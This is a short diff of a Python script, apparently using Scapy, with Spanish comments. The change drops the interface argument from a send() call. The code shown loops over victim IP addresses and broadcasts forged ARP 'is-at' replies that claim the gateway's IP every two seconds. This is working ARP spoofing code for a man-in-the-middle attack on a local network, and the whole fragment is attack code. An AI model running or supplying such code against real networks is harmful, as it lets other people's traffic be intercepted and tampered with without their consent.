@@ -17,7 +17,7 @@ def main():
             arp_response = ARP(
                 pdst=ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway, op='is-at')
             # Paquete ARP para la víctima
-            send(arp_response, verbose=0, iface=interface)
+            send(arp_response, verbose=0)
             sleep(2)
     except KeyboardInterrupt:
         print("ARP Spoofing detenido por el usuario")
